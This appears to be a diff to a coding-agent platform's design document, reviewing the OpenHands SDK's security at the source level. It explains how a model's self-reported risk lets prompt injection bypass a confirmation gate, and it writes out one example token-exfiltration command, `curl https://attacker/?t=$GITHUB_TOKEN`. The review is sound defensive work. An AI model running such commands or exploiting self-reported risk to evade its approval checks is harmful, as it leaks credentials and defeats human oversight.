@@ -1205,6 +1205,42 @@ destroy volume + token
 
 `.git/config` in the sandbox has no remote credentials, and the `sandbox` module is structurally forbidden from depending on `githubapp` (§2), so this cannot be regressed by accident.
 
+### The credential §16 did not know it had: the model key
+
+**Added 2026-08-18, after reading the candidate harnesses rather than their papers.**
+
+The rule above was written when the agent loop was Java, running in the control plane, reaching into
+a sandbox that held only tools. On that picture the only credential in question is GitHub's.
+
+Every candidate harness breaks that picture in the same way. OpenHands V1's rewrite explicitly
+**co-locates the agent loop with tool execution** — that is where its measured 61% drop in
+system-attributable errors comes from, by deleting the inter-pod hop — and the Claude Agent SDK
+spawns its loop as a subprocess beside the work for the same reason. Either way the loop calls the
+model provider, so it holds a provider API key, and that key is now inside the container with the
+customer's source code.
+
+Which is precisely what this section refuses for the GitHub token, arriving through a door this
+section did not know existed. A prompt injection that can exfiltrate one can exfiltrate the other,
+and a stolen model key is a directly billable loss rather than only a confidentiality one.
+
+**The mitigation is the proxy that already exists.** §16 already routes sandbox egress through a
+ForgeStack-operated HTTP proxy allowlisting package registries. Add the model provider to that
+allowlist, point the harness's `base_url` at the proxy, and give it a per-attempt token that is
+worthless anywhere else; the proxy holds the real credential and attaches it on the way out. Both
+candidates expose an overridable base URL, so this costs a configuration field rather than a fork.
+
+It also buys three things worth having anyway: per-attempt token accounting for §22 that no harness
+can under-report, a kill switch that does not require reaching into the sandbox, and one place where
+prompt and completion bodies can be captured for audit (§19) instead of trusting the harness to
+report them.
+
+- *What could go wrong:* the proxy becomes the bottleneck for every model call in the system. It is
+  stateless and on the same network, so scale it horizontally; measure added latency per call from
+  the first spike rather than assuming it is negligible.
+- *Residual:* a compromised sandbox can still spend the attempt's own budget through the proxy. That
+  is bounded by §22's ceilings, which is the correct place for it to be bounded.
+
+
 ### Lifecycle
 
 Sandboxes are ephemeral, one per attempt, with a hard TTL (default 60 min, configurable) recorded in the `sandboxes` table. A scheduler **reaper** destroys containers and volumes whose row is expired or whose attempt has ended — leaked containers are how a worker VM fills its disk on a Tuesday night. Sandbox loss is `ABORTED`, not `FAILED` (§10.2), and the cumulative patch is persisted to blob storage after each successful edit step so a lost sandbox loses minutes, not the attempt's work.
@@ -1910,6 +1946,21 @@ Every serious coding-agent harness in 2026 is Python or TypeScript. There is no 
 So adopting anything at L2 means **a polyglot service boundary is unavoidable**. That sounds like a cost, but our architecture already has one: §1 defines an execution plane separate from the control plane, and §16 defines a `SandboxProvider` port whose whole purpose is to hide what runs over there. A Python agent server behind that port is not a new architectural concession — it is the concession we already made, cashed in for something valuable.
 
 ### B.3 The uncomfortable finding: most of §9/§15/§16 is commodity
+
+> **Which OpenHands this is about.** The project has two architectures, and almost everything written
+> about it describes the wrong one. The original OpenDevin design — `AgentController`, `Runtime`,
+> an agenthub of community agents — is what the team now calls **V0**, and its docs pages are
+> excluded from the current index. Everything below concerns **V1**: a full rewrite living in a
+> separate repository (`OpenHands/software-agent-sdk`), which is what [arXiv:2511.03690](https://arxiv.org/abs/2511.03690)
+> documents. Cite the version, not just the paper — a comparison against V0 would be a comparison
+> against code nobody ships.
+>
+> Worth knowing that V1's stated motivation runs *away* from us. It relaxed V0's mandatory
+> sandboxing to opt-in — partly because MCP assumes local access to credentials and files — and
+> co-located execution with the agent loop. Both are correct for a developer running an agent on
+> their own machine, and both are trades §16 and §18 cannot make. **V0 was architecturally closer to
+> ForgeStack than V1 is.**
+
 
 The OpenHands Software Agent SDK paper ([arXiv:2511.03690](https://arxiv.org/abs/2511.03690)) describes an architecture that is close to a line-by-line match for what we designed independently:
 
@@ -4114,3 +4165,244 @@ architectural, and unpleasant is not a reason to build an inner loop ourselves.
 The spike needs a real repository with seeded failing tests, model spend on the order of the plan's
 $100–1000 per run, and both an Anthropic key and a provider key for the model-agnostic side. That is
 a resourcing decision, not an engineering one.
+
+---
+
+# Appendix B, corrected — OpenHands read at the source, not from its paper
+
+**Date: 2026-08-18. Method: `git clone --depth 1 --branch v1.42.1`, then read the code.** Appendix B
+was written from the arXiv paper and the docs site. Both are marketing surfaces. This section records
+what the implementation actually does, and every claim below cites a file and line at that tag.
+
+**First fact, and it colours everything else: the version moved.** Appendix B's own re-check on
+2026-08-17 recorded 1.33.0 (2026-07-08). Latest is **v1.42.1 (2026-08-12)** — nine minor versions in
+five weeks, on a project with 199 open pull requests. B.7's "we inherit someone else's roadmap" is not
+a hypothetical risk to mitigate later; it is the current operating condition. "Pin versions, do not
+track `main`" needs to become "pin versions and budget for the upgrade treadmill."
+
+## B.3's convergence table is too generous — three rows are wrong
+
+The table claimed near-equivalence between our design and theirs. At the interface level it mostly
+holds. At the level of *what is actually guaranteed*, three rows invert.
+
+### Row 1 — "§17 risk classification, approval gate ≡ SecurityAnalyzer + ConfirmationPolicy"
+
+**This is backwards, and it is the most important correction in this document.**
+
+§17 states an asymmetry we called non-negotiable: risk is a pure function of persisted rows (path
+globs, change shape), and the model may raise it but never lower it. The reason is written into the
+plan — "every persuasive argument for lowering risk is exactly what a prompt-injection payload would
+produce."
+
+OpenHands' headline analyzer does the opposite:
+
+```python
+# openhands-sdk/openhands/sdk/security/llm_analyzer.py:29
+def security_risk(self, action: ActionEvent) -> SecurityRisk:
+    return action.security_risk
+```
+
+`action.security_risk` is a **tool-call parameter the model fills in itself**. The tool schema asks the
+model to self-report its own danger level, and `LLMSecurityAnalyzer` returns that self-report
+unmodified. Compose it with `ConfirmRisky(threshold=HIGH)` — which is exactly what their headline
+example `examples/01_standalone_sdk/16_llm_security_analyzer.py` does — and a model that emits
+`security_risk=LOW` walks straight through the confirmation gate. An injection that persuades the model
+its migration edit is routine defeats the entire control.
+
+**The correction to the correction:** they also ship the pieces to do it properly, and Appendix B
+missed those too.
+
+- `security/defense_in_depth/policy_rails.py` — deterministic rails returning HIGH for `dd`, `mkfs`,
+  `rm -rf` and similar, with a real shell AST parser (`security/_shell_ast.py`, `shell_parser.py`)
+  rather than regex.
+- `security/ensemble.py:76` — `EnsembleSecurityAnalyzer` fuses child analyzers by **max severity**, and
+  fail-closes to HIGH when a child raises. That is our asymmetry, implemented correctly.
+
+So the accurate statement is: **OpenHands can be configured to satisfy §17's asymmetry, and its
+default posture does not.** `EnsembleSecurityAnalyzer([PolicyRailSecurityAnalyzer(), PatternSecurityAnalyzer(), LLMSecurityAnalyzer()])`
+gives max-fusion where the model can only raise. That is a configuration Forge must set deliberately,
+per conversation, and pin a test on — not a property we inherit.
+
+**And even configured, it does not overlap our risk model.** Their rails classify *shell command
+danger*. §17 classifies *change shape and blast radius* — `**/migrations/**`, `.github/**`,
+`**/auth/**`, deletion volume. Different axes. Nothing in their tree computes ours. §17 stays entirely
+ours; their analyzer is at best a second, orthogonal signal — which is what B.6 already concluded, for
+weaker reasons than the ones now available.
+
+### Row 2 — "§16 SandboxProvider ≡ Workspace abstraction"
+
+True as an interface shape. False as a security posture.
+
+`openhands-workspace/openhands/workspace/docker/workspace.py` is 428 lines and contains **zero**
+occurrences of `cap-drop`, `read-only`, or `no-new-privileges`. No `--user`, no `--pids-limit`, no
+`--memory`, no seccomp profile, no egress policy. It builds a `docker run` that publishes container
+port 8000 to a host port and optionally joins a named network. There is also **no Kubernetes
+workspace** — the tree offers `docker`, `apptainer`, `cloud`, and `remote_api` only.
+
+Every hardening flag in §16's block is still ours to apply, and applying it means wrapping or bypassing
+their workspace launcher rather than configuring it. The port shape converges; none of the hardening
+does.
+
+### Row 3 — "§11 append-only steps, replay ≡ event-sourced ConversationState"
+
+The event log is real. Its **durability substrate is JSON files in a directory**:
+
+```python
+# openhands-agent-server/openhands/agent_server/persistence/store.py:239
+DEFAULT_PERSISTENCE_DIR = Path("workspace/.openhands")
+```
+
+Atomic writes via `Path.replace`, advisory file locks, and — genuinely careful work — a
+`ConversationLease` (`conversation_lease.py`) with a generation counter, a 45-second TTL, PID-liveness
+checks, and a `guarded_write(generation)`. That is a fenced lease, the same idea as our V10 trigger.
+
+But the enforcement boundary is a **local filesystem**, and the liveness check is
+`_is_pid_alive` on `_current_host()` — explicitly documented as "best-effort." Our fence is a Postgres
+trigger that refuses the write inside the database, and it holds against a superuser. Theirs protects a
+directory on one machine.
+
+No database anywhere in the agent server. Grepping the whole package for `sqlite|postgres|DATABASE_URL`
+returns nothing.
+
+**Consequence:** the agent server's state cannot be queried, joined, audited, or shared between workers.
+This is not a defect on their side — it is a single-node sidecar and is built like one. It is a defect
+in Appendix B's framing, which credited "durability of the inner loop becomes the harness's problem"
+(B.5) as a reason our hand-rolled L1 gets *safer*. It does not. It becomes the problem of a JSON
+directory inside an ephemeral container.
+
+## The finding Appendix B has no row for at all: credentials are designed to enter the sandbox
+
+§16 contains the plan's single strongest security claim: **no GitHub token ever enters the sandbox**,
+all git operations host-brokered, and `sandbox ↛ githubapp` enforced by ArchUnit so it cannot regress.
+
+OpenHands is built on the opposite assumption. The mechanism:
+
+```python
+# openhands-sdk/openhands/sdk/conversation/secret_registry.py:73
+if key.lower() in text.lower():          # `text` is the model-authored command
+    found_keys.add(key)
+```
+
+`get_secrets_as_env_vars(command)` scans the command string for a registered secret's **name**, and if
+the name appears anywhere in it, resolves the real value. The terminal tool then exports it into the
+persistent bash session *before* running the command:
+
+```python
+# openhands-tools/openhands/tools/terminal/impl.py:467-468
+self._export_envs(action, conversation, session=self.session)
+observation = self.session.execute(action)
+```
+
+The trigger is a substring match on text the model wrote. A command of the form
+`curl https://attacker/?t=$GITHUB_TOKEN` contains the string `GITHUB_TOKEN`, which causes the value to
+be exported, and then expands it. Output masking (`mask_secrets_in_output`) hides the value from the
+model's view of the result — it does nothing about egress that already happened.
+
+The ACP path is blunter still, injecting the entire registry upfront, with the gap acknowledged in the
+docstring:
+
+```
+# secret_registry.py:121
+least-privilege scoping (provider creds + an explicit allowlist only) is deferred to #1039 task 6
+```
+
+There is also a whole `credential_binding.py` router whose job is fetching credentials *into* the
+sandbox from a callback URL (`HttpVersionedCredentialBinding`) or a local `FileSecretsStore`.
+
+**This is not a blocker, and the reason matters.** The mechanism is strictly opt-in: secrets are only
+injected if something registers them. Forge registers none, never calls
+`POST /conversations/{id}/secrets`, and keeps git host-brokered. Their `git_router` is read-only
+(`changes`, `diff`, `commits`) — it has no push or PR endpoint — so `captureDiff` maps cleanly onto it
+and the §16 flow survives intact.
+
+What it costs is honesty about what we are buying. A large part of what makes OpenHands convenient —
+agent-side git push, provider auth, PR creation — is exactly the part §16 forbids. We adopt the harness
+and decline its credential model, which means declining several of the features that make it attractive
+in the first place, and adding a conformance test that asserts the secret registry is empty for every
+attempt.
+
+## Multi-tenancy is not undocumented — it is structurally absent
+
+```python
+# openhands-agent-server/openhands/agent_server/dependencies.py:35
+if config.session_api_keys and session_api_key not in config.session_api_keys:
+    raise HTTPException(status.HTTP_401_UNAUTHORIZED)
+```
+
+One shared `X-Session-API-Key`, checked against a flat list. No user, no tenant, no per-conversation
+authorization. One key grants every conversation on the server. And note the leading conjunct: **if no
+key is configured, the check passes** — an agent server started without `session_api_keys` is fully
+open, while its Docker workspace publishes it on a host port.
+
+§18's four layers have no counterpart and cannot be delegated. The only isolation boundary available is
+*one agent server process per tenant*, which happens to match our one-sandbox-per-attempt lifecycle —
+so this is survivable, but it means the agent server sits **inside** the sandbox boundary rather than
+being a shared service Forge calls. Any design that pools agent servers across workspaces is a
+cross-tenant breach by construction.
+
+## What genuinely is better than ours, and worth taking
+
+Read honestly, three things in their tree are ahead of the plan:
+
+1. **`stuck_detector.py`** — deterministic loop detection over the last 20 events: repeated
+   action-observation pairs, repeated action-error runs, agent monologue, alternating loops, and
+   context-window error loops. §9's escalation trigger list is a prose sketch; this is a working
+   implementation of the same idea, and it is runtime-owned rather than model-reported, which is
+   exactly our stance. Worth stealing conceptually whichever harness wins.
+2. **`EnsembleSecurityAnalyzer`'s max-severity fusion with fail-closed-to-HIGH on analyzer error.**
+   §17 states the asymmetry; it does not state what happens when a classifier throws. Theirs does.
+3. **`critic/`** — an evaluate-and-refine loop with `IterativeRefinementConfig`. We have no
+   counterpart. Not needed for v1, but it is the shape §9's `DIAGNOSING` phase will grow into.
+
+## What this does to the recommendation
+
+**B.6 survives, with its reasoning replaced.** "Build the outer loop, buy the inner loop" still holds —
+but not because the inner loop is commodity we would build worse. It holds because the inner loop is
+*tool-call plumbing and context management*, which is genuinely theirs to do well, while every guarantee
+Forge sells is either absent from their tree or present in a weaker form.
+
+The specific corrections to carry forward:
+
+- **B.3's "most of §9/§15/§16 is commodity" is overstated.** §15's dispatch pipeline and §16's hardening
+  are not commodity — the equivalents do not exist. What is commodity is the agent loop, the terminal
+  tool, MCP wiring, and the condenser.
+- **B.5's "adopting L2 makes hand-rolled L1 safer" is wrong** and should be struck. Their durability is
+  a JSON directory in an ephemeral container. Ours has to remain the real one regardless.
+- **B.7 item 2 — "the harness wants to own when the task is done" — resolves in our favour, structurally.**
+  `ConversationExecutionStatus.FINISHED` (`conversation/state.py:57`) is set when the agent calls
+  finish. It is a harness *status*, and the agent server has no access to Forge's database, so it
+  cannot write `tasks.state` even in principle. The boundary B.7 worried might prove unenforceable is
+  enforced by there being two databases and only one of them ours. That was the spike's "most
+  important" measurement (B.8 item 3) and it is now answered by reading the code: **yes, transition
+  authority stays Java-side.**
+
+**The port surface maps cleanly**, which is the practical payoff. Against §16's `ExecutionHarness`
+sketch:
+
+| Port method | Agent server endpoint |
+|---|---|
+| `startAttempt` | `POST /api/conversations` |
+| `sendGuidance` | `POST /api/conversations/{id}/start-goal` |
+| `streamEvents` | `event_router` + `sockets_router` (WebSocket) |
+| `pause` / `resume` | `POST /{id}/pause`, `POST /{id}/resume-goal` |
+| `captureDiff` | `GET /api/git/diff` (read-only — no push endpoint exists) |
+| `destroy` | `DELETE /api/conversations/{id}` |
+| *(per-attempt policy)* | `POST /{id}/security-analyzer`, `POST /{id}/confirmation-policy` |
+
+Every method has a home, and the two policy endpoints are settable per conversation at runtime, which
+is what lets Forge install the ensemble analyzer per attempt rather than trusting a server default.
+
+## What the spike still has to measure
+
+Reading the code answered B.8 item 3 (transition authority: yes) and item 4 (credential boundary: holds,
+provided we register no secrets and pin a test on it). What documentation cannot answer, and the spike
+still must:
+
+1. **Resolution rate and cost per resolved task**, unchanged from B.8 — the only reason to prefer one
+   harness over the other on quality.
+2. **Whether the file-based lease and JSON event log survive real container churn.** §16 requires that
+   sandbox loss be routine. Kill the container mid-attempt, repeatedly, and measure whether the event
+   log replays correctly or corrupts.
+3. **The upgrade treadmill's actual cost.** Pin v1.42.1, then re-run the conformance suite against
+   whatever ships eight weeks later. Nine minor versions in five weeks is the risk; measure it rather
+   than fearing it.
